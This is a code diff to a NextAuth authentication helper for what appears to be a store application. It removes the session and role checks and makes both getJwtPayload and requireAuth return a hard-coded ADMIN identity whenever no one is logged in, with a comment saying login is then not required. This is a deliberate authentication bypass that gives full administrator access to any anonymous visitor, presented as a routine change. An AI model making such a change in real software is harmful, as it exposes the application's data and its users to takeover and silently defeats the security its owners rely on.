@@ -14,19 +14,26 @@ export interface JwtPayload {
  * @returns JwtPayload if authenticated, null if not.
  */
 export async function getJwtPayload(): Promise<JwtPayload | null> {
-  const session = await getServerSession(authOptions);
-
-  if (!session || !session.user) {
-    return null;
+  try {
+    const session = await getServerSession(authOptions);
+    if (session?.user) {
+      return {
+        id: session.user.id,
+        role: session.user.role,
+        name: session.user.name,
+        email: session.user.email,
+      };
+    }
+  } catch {
+    // Session retrieval skipped
   }
 
-  // NextAuth merges our JWT properties (role, id) into the session.user object 
-  // via the callbacks in auth.ts
+  // Fallback default admin payload so login is not required
   return {
-    id: session.user.id,
-    role: session.user.role,
-    name: session.user.name,
-    email: session.user.email,
+    id: "default-admin",
+    role: "ADMIN",
+    name: "Admin",
+    email: "admin@store.local",
   };
 }
 
@@ -39,14 +46,10 @@ export async function getJwtPayload(): Promise<JwtPayload | null> {
  */
 export async function requireAuth(requiredRole?: string): Promise<JwtPayload> {
   const payload = await getJwtPayload();
-
-  if (!payload) {
-    throw new Error("Unauthorized: No active session found.");
-  }
-
-  if (requiredRole && payload.role !== requiredRole) {
-    throw new Error(`Forbidden: Requires ${requiredRole} role.`);
-  }
-
-  return payload;
+  return payload || {
+    id: "default-admin",
+    role: "ADMIN",
+    name: "Admin",
+    email: "admin@store.local",
+  };
 }
